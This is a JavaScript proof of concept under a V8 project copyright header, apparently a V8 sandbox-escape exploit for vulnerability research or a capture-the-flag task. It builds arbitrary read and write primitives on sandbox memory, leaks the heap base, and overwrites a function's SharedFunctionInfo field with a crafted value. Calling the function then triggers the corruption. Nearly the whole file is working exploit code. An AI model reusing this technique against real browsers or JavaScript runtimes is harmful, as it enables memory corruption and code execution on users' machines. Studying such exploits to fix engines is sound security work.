// Copyright 2017 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: r --expose-gc --allow-natives-syntax --sandbox-testing ../../../tests/test4.js
let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
    return Sandbox.getAddressOf(obj);
  }
  
  function v8_read64(addr) {
    return sandboxMemory.getBigUint64(Number(addr), true);
  }
  
  function v8_write64(addr, val) {
    return sandboxMemory.setBigInt64(Number(addr), val, true);
  }


Object.prototype.__defineGetter__(0, () => {
  throw Error();
});
var a = [, 0.1];
function foo(i) {
  a[i];
};
for (var i = 0; i < 0x10000; ++i) {
  foo(1);
}
// ============================= read heapbase =============================
let ofs1 = 0x48;
let heap_addr = v8_read64(ofs1) & 0xffffffff00000000n;
console.log("heap_addr: 0x" + heap_addr.toString(16));
/// ========================================================================

const dummy = new Int8Array(150);

// =============== debug =========================
// console.log("dummy addr: 0x" + (heap_addr + BigInt(addrOf(dummy))).toString(16));
// console.log("======================================================================");
// %DebugPrint(dummy);
// console.log("======================================================================");
// %DebugPrint(foo);

// console.log("foo: 0x" + addrOf(foo).toString(16));
// console.log("foo_addr+0x10: 0x" + (v8_read64(addrOf(foo)+0x10) & 0xffffffffn).toString(16));
// ========================== overwrite sfi ==========================
let sfi = (v8_read64(addrOf(foo)+0x10) & 0xffffffffn)+ 0x20n;
console.log("sfi: 0x" + sfi.toString(16));
let write_addr = Number(sfi) - 7;

console.log(v8_read64(write_addr).toString(16));
v8_write64(write_addr,0x11001002000c0f02n);
console.log(v8_read64(write_addr).toString(16));
// ========================== trigger ==========================
// %SystemBreak();
foo(0);


